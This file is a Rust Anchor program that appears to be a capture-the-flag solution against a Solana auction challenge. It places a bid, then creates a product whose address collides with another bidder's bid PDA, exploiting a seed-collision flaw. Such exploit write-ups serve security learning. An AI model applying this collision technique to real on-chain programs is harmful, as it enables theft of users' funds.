use anchor_lang::prelude::*;

declare_id!("28prS7e14Fsm97GE5ws2YpjxseFNkiA33tB5D3hLZv3t");

#[program]
pub mod solve {
    use super::*;

    pub fn initialize(ctx: Context<Initialize>, product_name: [u8; 32], product_id: [u8; 32]) -> Result<()> {
        // solve goes here:

        // Bid any amount
        let cpi_accounts = chall::cpi::accounts::Bid {
            bid: ctx.accounts.bid.to_account_info(),
            auction: ctx.accounts.auction.to_account_info(),
            product: ctx.accounts.product.to_account_info(),
            bidder: ctx.accounts.user.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::bid(cpi_ctx, 1234)?;
        
        // Create a product that collides with rich_boi_bid PDA
        let cpi_accounts = chall::cpi::accounts::CreateProduct {
            product: ctx.accounts.rich_boi_bid.to_account_info(),
            user: ctx.accounts.user.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::create_product(cpi_ctx, product_name.to_vec(), product_id)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    // feel free to expand/change this as needed
    // if you change this, make sure to change framework-solve/src/main.rs accordingly

    #[account(mut)]
    pub admin: AccountInfo<'info>,

    #[account(mut)]
    pub rich_boi: AccountInfo<'info>,

    #[account(mut)]
    pub user: Signer<'info>,

    #[account(mut)]
    pub auction: AccountInfo<'info>,

    #[account(mut)]
    pub product: AccountInfo<'info>,

    #[account(mut)]
    pub bid: AccountInfo<'info>,

    #[account(mut)]
    pub rich_boi_bid: AccountInfo<'info>,

    pub system_program: Program<'info, System>,

    pub chall: Program<'info, chall::program::Chall>,

    pub rent: Sysvar<'info, Rent>,
}